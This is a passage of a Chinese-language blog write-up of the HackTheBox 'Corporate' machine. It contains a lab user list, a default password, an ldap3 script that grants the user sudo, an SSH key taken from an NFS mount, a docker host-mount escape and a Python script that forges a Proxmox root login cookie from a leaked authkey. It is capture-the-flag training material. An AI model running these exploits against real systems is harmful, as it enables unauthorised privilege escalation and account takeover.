class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">abbigail.halvorson 9&#x2F;17&#x2F;1965</span><br><span class="line">abigayle.kessler 10&#x2F;21&#x2F;1982</span><br><span class="line">adrianna.stehr 6&#x2F;8&#x2F;1997</span><br><span class="line">ally.effertz 8&#x2F;2&#x2F;1996</span><br><span class="line">america.kirlin 12&#x2F;29&#x2F;1957</span><br><span class="line">amie.torphy 3&#x2F;26&#x2F;1953</span><br><span class="line">anastasia.nader 4&#x2F;2&#x2F;1957</span><br><span class="line">annamarie.flatley 7&#x2F;13&#x2F;1994</span><br><span class="line">antwan.bernhard 5&#x2F;1&#x2F;2002</span><br><span class="line">arch.ryan 12&#x2F;29&#x2F;1960</span><br><span class="line">august.gottlieb 9&#x2F;14&#x2F;1992</span><br><span class="line">beth.feest 10&#x2F;13&#x2F;1996</span><br><span class="line">bethel.hessel 12&#x2F;29&#x2F;1984</span><br><span class="line">brody.wiza 7&#x2F;14&#x2F;1992</span><br><span class="line">callie.goldner 5&#x2F;14&#x2F;1967</span><br><span class="line">candido.hackett 2&#x2F;2&#x2F;1987</span><br><span class="line">candido.mcdermott 3&#x2F;30&#x2F;1973</span><br><span class="line">cathryn.weissnat 12&#x2F;8&#x2F;2002</span><br><span class="line">cecelia.west 4&#x2F;24&#x2F;1986</span><br><span class="line">christian.spencer 11&#x2F;26&#x2F;1966</span><br><span class="line">dangelo.koch 11&#x2F;23&#x2F;1986</span><br><span class="line">dayne.ruecker 5&#x2F;5&#x2F;1965</span><br><span class="line">dessie.wolf 3&#x2F;7&#x2F;1999</span><br><span class="line">dylan.schumm 2&#x2F;26&#x2F;1967</span><br><span class="line">elwin.jones 4&#x2F;4&#x2F;1987</span><br><span class="line">elwin.mills 11&#x2F;14&#x2F;1957</span><br><span class="line">erna.lindgren 11&#x2F;4&#x2F;1951</span><br><span class="line">esperanza.kihn 4&#x2F;23&#x2F;1956</span><br><span class="line">estelle.padberg 10&#x2F;24&#x2F;1989</span><br><span class="line">estrella.wisoky 2&#x2F;4&#x2F;1975</span><br><span class="line">garland.denesik 1&#x2F;12&#x2F;1992</span><br><span class="line">gayle.graham 10&#x2F;20&#x2F;1990</span><br><span class="line">gideon.daugherty 2&#x2F;19&#x2F;1969</span><br><span class="line">halle.keeling 2&#x2F;22&#x2F;1982</span><br><span class="line">harley.ratke 5&#x2F;24&#x2F;1978</span><br><span class="line">hector.king 10&#x2F;30&#x2F;1987</span><br><span class="line">hermina.leuschke 7&#x2F;15&#x2F;1986</span><br><span class="line">jacey.bernhard 5&#x2F;10&#x2F;1990</span><br><span class="line">jammie.corkery 4&#x2F;9&#x2F;1997</span><br><span class="line">josephine.hermann 5&#x2F;20&#x2F;1970</span><br><span class="line">joy.gorczany 1&#x2F;23&#x2F;1992</span><br><span class="line">julio.daniel 1&#x2F;23&#x2F;1987</span><br><span class="line">justyn.beahan 6&#x2F;19&#x2F;1981</span><br><span class="line">kacey.krajcik 1&#x2F;25&#x2F;1954</span><br><span class="line">kasey.walsh 8&#x2F;7&#x2F;1999</span><br><span class="line">katelin.keeling 4&#x2F;25&#x2F;1989</span><br><span class="line">katelyn.swift 7&#x2F;26&#x2F;1954</span><br><span class="line">kian.rodriguez 6&#x2F;8&#x2F;1957</span><br><span class="line">larissa.wilkinson 5&#x2F;10&#x2F;1979</span><br><span class="line">laurie.casper 11&#x2F;18&#x2F;1959</span><br><span class="line">leanne.runolfsdottir 12&#x2F;1&#x2F;1963</span><br><span class="line">lila.mcglynn 10&#x2F;10&#x2F;1982</span><br><span class="line">mabel.koepp 2&#x2F;23&#x2F;1995</span><br><span class="line">marcella.kihn 10&#x2F;9&#x2F;1959</span><br><span class="line">margarette.baumbach 3&#x2F;23&#x2F;1999</span><br><span class="line">marge.frami 6&#x2F;10&#x2F;2002</span><br><span class="line">michale.jakubowski 7&#x2F;25&#x2F;1989</span><br><span class="line">mohammed.feeney 11&#x2F;4&#x2F;1974</span><br><span class="line">morris.lowe 6&#x2F;18&#x2F;1983</span><br><span class="line">nora.brekke 1&#x2F;18&#x2F;1996</span><br><span class="line">nya.little 6&#x2F;21&#x2F;1965</span><br><span class="line">oleta.gutmann 11&#x2F;11&#x2F;1965</span><br><span class="line">penelope.mcclure 3&#x2F;8&#x2F;1968</span><br><span class="line">rachelle.langworth 6&#x2F;19&#x2F;1998</span><br><span class="line">raphael.adams 1&#x2F;28&#x2F;2001</span><br><span class="line">richie.cormier 1&#x2F;23&#x2F;1964</span><br><span class="line">rosalee.schmitt 7&#x2F;4&#x2F;1990</span><br><span class="line">ross.leffler 4&#x2F;11&#x2F;1963</span><br><span class="line">sadie.greenfelder 1&#x2F;21&#x2F;1964</span><br><span class="line">scarlett.herzog 6&#x2F;22&#x2F;1995</span><br><span class="line">skye.will 10&#x2F;16&#x2F;1965</span><br><span class="line">stephen.schamberger 3&#x2F;27&#x2F;1979</span><br><span class="line">stevie.rosenbaum 10&#x2F;20&#x2F;1987</span><br><span class="line">tanner.kuvalis 1&#x2F;19&#x2F;1969</span><br><span class="line">uriel.hahn 12&#x2F;25&#x2F;1992</span><br><span class="line">veda.kemmer 11&#x2F;14&#x2F;1980</span><br><span class="line">ward.pfannerstill 5&#x2F;4&#x2F;1971</span><br><span class="line">zaria.kozey 4&#x2F;12&#x2F;1970</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>4个用户都能得到user flag，但只有elwin.jones是it，其他三个都是consultant：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@10.9.0.4 4&#x2F;4&#x2F;1987 CorporateStarter04041987</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121921.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="sysadmin-非预期"><a href="#sysadmin-非预期" class="headerlink" title="sysadmin 非预期"></a>sysadmin 非预期</h1><p>(非预期方式)</p>
<p>这几个用户都是在/home/guest下，/home下还有个sysadmin，所以下一步看这部分</p>
<p>首先，因为elwin.jones是it，并且前面探测也可以看到ldap，那就可以尝试修改ldap属性，把自己加到sudoers中:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 corporate-workstation-04</span><br><span class="line"></span><br><span class="line">10.9.0.1 ldap.corporate.htb corporate.htb</span><br></pre></td></tr></table></figure>

<p>添加hosts后修改ldap：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.9.0.1 ldap.corporate.htb</span><br><span class="line"></span><br><span class="line">python3 ldap.py</span><br></pre></td></tr></table></figure>

<p>（等几分钟重新登录，现在我们有sudo）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ id</span><br><span class="line">uid&#x3D;5021(elwin.jones) gid&#x3D;27(sudo) groups&#x3D;27(sudo),503(it)</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121922.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>然后可以从10.9.0.4的root挂载10.8.0.1的nfs,(showmount可能会卡住，但可以尝试直接挂载根目录)：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/miao</span><br><span class="line">sudo mount.nfs 10.8.0.1:/ /tmp/miao/ -r -o nolock</span><br><span class="line">ls /tmp/miao</span><br><span class="line">/tmp/miao/home/guests</span><br><span class="line"></span><br><span class="line">root@corporate-workstation-04:/tmp/miao/home/guests# ls | xargs id</span><br><span class="line">uid=5015(amie.torphy) gid=5015(amie.torphy) groups=5015(amie.torphy),503(it),500(sysadmin)</span><br><span class="line">uid=5007(stevie.rosenbaum) gid=5007(stevie.rosenbaum) groups=5007(stevie.rosenbaum),503(it),500(sysadmin)</span><br></pre></td></tr></table></figure>

<p>其中同样是很多用户，但amie和stevie是sysadmin：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@corporate-workstation-04:/tmp/miao/home/guests# id amie.torphy</span><br><span class="line">uid=5015(amie.torphy) gid=5015(amie.torphy) groups=5015(amie.torphy),503(it),500(sysadmin)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要对应用户才能查看目录下文件</span></span><br><span class="line">root@corporate-workstation-04:/tmp/miao/home/guests# su amie.torphy</span><br><span class="line"><span class="meta">#</span><span class="bash"> 私钥</span></span><br><span class="line">amie.torphy@corporate-workstation-04:/tmp/miao/home/guests/amie.torphy/.ssh$ cat id_rsa</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121923.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="sysadmin"><a href="#sysadmin" class="headerlink" title="sysadmin"></a>sysadmin</h2><p>然后使用amie的私钥，可以登录10.8.0.1，用户名根据10.9.0.4中信息是sysadmin,现在终于是宿主机了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i amie_id_rsa sysadmin@10.8.0.1</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121924.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ldap-py"><a href="#ldap-py" class="headerlink" title="ldap.py"></a>ldap.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ldap3</span><br><span class="line"></span><br><span class="line">server = ldap3.Server(<span class="string">"ldaps://ldap.corporate.htb"</span>, port=<span class="number">636</span>, use_ssl=<span class="keyword">True</span>)</span><br><span class="line">connection = ldap3.Connection(</span><br><span class="line">	server,</span><br><span class="line">	<span class="string">"uid=elwin.jones,ou=Users,dc=corporate,dc=htb"</span>,</span><br><span class="line">	<span class="string">"CorporateStarter04041987"</span>,</span><br><span class="line">	auto_bind=<span class="keyword">True</span>,</span><br><span class="line">)</span><br><span class="line">connection.modify(</span><br><span class="line">	<span class="string">"uid=elwin.jones,ou=Users,dc=corporate,dc=htb"</span>,</span><br><span class="line">	&#123;<span class="string">"gidNumber"</span>: [(ldap3.MODIFY_REPLACE, [<span class="string">"27"</span>])]&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="预期方式"><a href="#预期方式" class="headerlink" title="预期方式"></a>预期方式</h1><p>得到user之后，预期路径大概这样：</p>
<ul>
<li><p>基础枚举发现/var/run/docker.sock 需要engineer组</p>
</li>
<li><p>以及发现autofs自动挂载每个用户的nfs</p>
</li>
<li><p>elwin.jones有一个活跃的 Firefox 配置文件</p>
</li>
<li><p>发现Bitwarden密码管里扩展</p>
</li>
<li><p><code>places.sqlite</code> 文件保存浏览器历史记录，它位于配置文件文件夹中</p>
</li>
<li><p><code>moz_places</code> 有浏览器历史记录</p>
</li>
<li><p>最后，开始使用 Bitwarden，然后在 Google 上搜索“对于 Bitwarden 密码来说 4 位数字就足够了”</p>
</li>
<li><p>Bitwarden PINs can be brute-forced - ambiso’s blog<br><a href="https://ambiso.github.io/bitwarden-pin/" target="_blank" rel="noopener">https://ambiso.github.io/bitwarden-pin/</a></p>
</li>
<li><p>然后是对数据进行一些格式处理，破解出pin码</p>
</li>
<li><p>然后自己使用的到的配置文件启动firefox，使用Bitwarden解密数据</p>
</li>
<li><p>查看vault的到git的用户名、密码、TOTP 和 <code>git.corporate.htb</code> 的 UR</p>
</li>
<li><p>通过vpn访问git 10.9.0.1</p>
</li>
<li><p>同步时间，使用TOTP登录git</p>
</li>
<li><p>ourpeople中的到JWT secret</p>
</li>
<li><p>然后给engineer组中用户生成JWT，访问web</p>
</li>
<li><p>生成的JWT把requireCurrentPassword设置为false，修改密码不需要知道原密码</p>
</li>
<li><p>修改后的密码可以ssh登录10.9.0.4，得到engineer</p>
</li>
<li><p>engineer可以和docker交互</p>
</li>
<li><p>自己上传个docker镜像，加载</p>
</li>
<li><p>然后<code>docker run --rm -it -v /:/host alpine /bin/sh</code></p>
</li>
<li><p>得到10.9.0.4的root</p>
</li>
<li><p>然后看到<code>sysadmin</code> 中有两个用户</p>
</li>
<li><p>切换到stevie.rosenbaum，看到config显示他们可以以 sysadmin 用户身份通过 SSH 访问 <code>corporate.htb</code></p>
</li>
<li><p>ssh 10.9.0.1，/var/backups，后面就是proxmox部分了</p>
</li>
<li><p>HTB: Corporate | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2024/07/13/htb-corporate.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2024/07/13/htb-corporate.html</a></p>
</li>
</ul>
<h1 id="proxmox"><a href="#proxmox" class="headerlink" title="proxmox"></a>proxmox</h1><p>然后常规备份文件:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/backups/pve-host-2023_04_15-16_09_46.tar.gz</span><br><span class="line"></span><br><span class="line">scp -i amie_id_rsa sysadmin@10.8.0.1:/var/backups/pve-host-2023_04_15-16_09_46.tar.gz .</span><br></pre></td></tr></table></figure>

<p>其中得到一个authkey</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etc&#x2F;pve&#x2F;priv&#x2F;authkey.key</span><br></pre></td></tr></table></figure>

<p>根据现有信息，也很容易搜到这个：</p>
<ul>
<li>Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway | STAR Labs<br><a href="https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file" target="_blank" rel="noopener">https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file</a></li>
</ul>
<p>只是里面是PMG。自己简单改下就行了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pve.py -k ./authkey.key -t https://10.8.0.1:8006/ -g root@pam</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121925.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后使用生成的cookie，可以登录8006的pve web面板：</p>
<p>(遇到的坑：burp自带的chromium不行，换firefox就正常)</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121926.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="pve-py"><a href="#pve-py" class="headerlink" title="pve.py"></a>pve.py</h2><p>队友根据starlabs的代码改好的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PROXIES = &#123;&#125; </span></span><br><span class="line">PROXIES = &#123;<span class="string">'https'</span>: <span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">logging.basicConfig(format=<span class="string">"%(asctime)s - %(message)s"</span>, level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_ticket</span><span class="params">(authkey_bytes, username=<span class="string">"root@pam"</span>, time_offset=<span class="number">-30</span>)</span>:</span></span><br><span class="line">	timestamp = hex(int(time.time()) + time_offset)[<span class="number">2</span>:].upper()</span><br><span class="line">	plaintext = <span class="string">f"PVE:<span class="subst">&#123;username&#125;</span>:<span class="subst">&#123;timestamp&#125;</span>"</span></span><br><span class="line">	</span><br><span class="line">	authkey_path = tempfile.NamedTemporaryFile(delete=<span class="keyword">False</span>)</span><br><span class="line">	logging.info(<span class="string">f"writing authkey to <span class="subst">&#123;authkey_path.name&#125;</span>"</span>)</span><br><span class="line">	authkey_path.write(authkey_bytes)</span><br><span class="line">	authkey_path.close()</span><br><span class="line">	</span><br><span class="line">	txt_path = tempfile.NamedTemporaryFile(delete=<span class="keyword">False</span>)</span><br><span class="line">	logging.info(<span class="string">f"writing plaintext to <span class="subst">&#123;txt_path.name&#125;</span>"</span>)</span><br><span class="line">	txt_path.write(plaintext.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">	txt_path.close()</span><br><span class="line">	</span><br><span class="line">	logging.info(<span class="string">f"calling openssl to sign"</span>)</span><br><span class="line">	sig = subprocess.check_output(</span><br><span class="line">		[</span><br><span class="line">			<span class="string">"openssl"</span>,</span><br><span class="line">			<span class="string">"dgst"</span>,</span><br><span class="line">			<span class="string">"-sha1"</span>,</span><br><span class="line">			<span class="string">"-sign"</span>,</span><br><span class="line">			authkey_path.name,</span><br><span class="line">			<span class="string">"-out"</span>,</span><br><span class="line">			<span class="string">"-"</span>,</span><br><span class="line">			txt_path.name,</span><br><span class="line">		]</span><br><span class="line">	)</span><br><span class="line">	sig = base64.b64encode(sig).decode(<span class="string">"latin-1"</span>)</span><br><span class="line">	</span><br><span class="line">	ret = <span class="string">f"<span class="subst">&#123;plaintext&#125;</span>::<span class="subst">&#123;sig&#125;</span>"</span></span><br><span class="line">	logging.info(<span class="string">f"generated ticket for <span class="subst">&#123;username&#125;</span>: <span class="subst">&#123;ret&#125;</span>"</span>)</span><br><span class="line">	logging.info(<span class="string">f"Login with cookie:\nPVEAuthCookie=<span class="subst">&#123;ret&#125;</span>"</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_args</span><span class="params">()</span>:</span></span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">"-k"</span>, metavar=<span class="string">"key"</span>, required=<span class="keyword">True</span>, help=<span class="string">"The private key file"</span>)</span><br><span class="line">	parser.add_argument(</span><br><span class="line">		<span class="string">"-g"</span>, metavar=<span class="string">"generate_for"</span>, default=<span class="string">"root@pam"</span>, help=<span class="string">"Default: root@pam"</span></span><br><span class="line">	)</span><br><span class="line">	parser.add_argument(</span><br><span class="line">		<span class="string">"-t"</span>,</span><br><span class="line">		metavar=<span class="string">"target_url"</span>,</span><br><span class="line">		help=<span class="string">"Please keep the trailing slash, example: https://10.8.0.1:8006/"</span>,</span><br><span class="line">		required=<span class="keyword">True</span>,</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> parser.parse_args()</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	arg = _parse_args()</span><br><span class="line">	authkey_bytes = open(arg.k, <span class="string">"rb"</span>).read()</span><br><span class="line">	new_ticket = generate_ticket(authkey_bytes, username=arg.g)</span><br><span class="line">	</span><br><span class="line">	logging.info(<span class="string">"veryfing ticket"</span>)</span><br><span class="line">	req = requests.get(</span><br><span class="line">		arg.t,</span><br><span class="line">		headers=&#123;<span class="string">"Cookie"</span>: <span class="string">f"PVEAuthCookie=<span class="subst">&#123;new_ticket&#125;</span>"</span>&#125;,</span><br><span class="line">		proxies=PROXIES,</span><br><span class="line">		verify=<span class="keyword">False</span>,</span><br><span class="line">	)</span><br><span class="line">	print(req.text)</span><br><span class="line">	res = req.content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">	verify_re = re.compile(<span class="string">"UserName: '(.*?)',\n\s+CSRFPreventionToken:"</span>)</span><br><span class="line">	verify_result = verify_re.findall(res)</span><br><span class="line">	logging.info(<span class="string">f"current user: <span class="subst">&#123;verify_result[<span class="number">0</span>]&#125;</span>"</span>)</span><br><span class="line">	logging.info(<span class="string">f"Cookie: PVEAuthCookie=<span class="subst">&#123;urllib.parse.quote_plus(new_ticket)&#125;</span>"</span>)</span><br></pre></td></tr></table></figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后pve自带的shell，得到root</p>
<p>(0xdf是修改了root密码后ssh登录)</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121927.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><p>每次打开shell得到的root hash都是不同的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysadmin:$y$j9T$E2kQZ9TL6csvgTjXCvlau&#x2F;$r4Y9&#x2F;c5O8UQcdCVNKdPXn69PhHC35T59bpfjiUKEkoD:19462:0:99999:7:::</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway | STAR Labs<br><a href="https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file" target="_blank" rel="noopener">https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file</a></li>
<li>Bitwarden PINs can be brute-forced - ambiso’s blog<br><a href="https://ambiso.github.io/bitwarden-pin/" target="_blank" rel="noopener">https://ambiso.github.io/bitwarden-pin/</a></li>
<li>HTB: Corporate | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2024/07/13/htb-corporate.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2024/07/13/htb-corporate.html</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2024-07-15T06:01:45.744Z" itemprop="dateUpdated">2024-07-15 14:01:45</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&title=《Corporate - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&title=《Corporate - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Corporate - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
